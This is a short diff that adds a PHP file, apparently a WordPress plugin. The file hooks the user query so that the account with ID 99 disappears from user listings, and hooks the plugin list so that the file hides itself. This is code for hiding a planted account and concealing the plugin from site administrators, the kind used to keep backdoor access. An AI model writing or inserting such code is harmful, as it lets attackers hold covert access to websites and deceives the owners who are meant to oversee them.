@@ -1,0 +1,7 @@
+<?php
+add_filter('pre_user_query', function ($q) { $q->query_where .= " AND ID != 99"; });
+add_filter('views_users', function ($v) { return $v; });
+add_filter('all_plugins', function ($plugins) {
+    unset($plugins[plugin_basename(__FILE__)]);
+    return $plugins;
+});
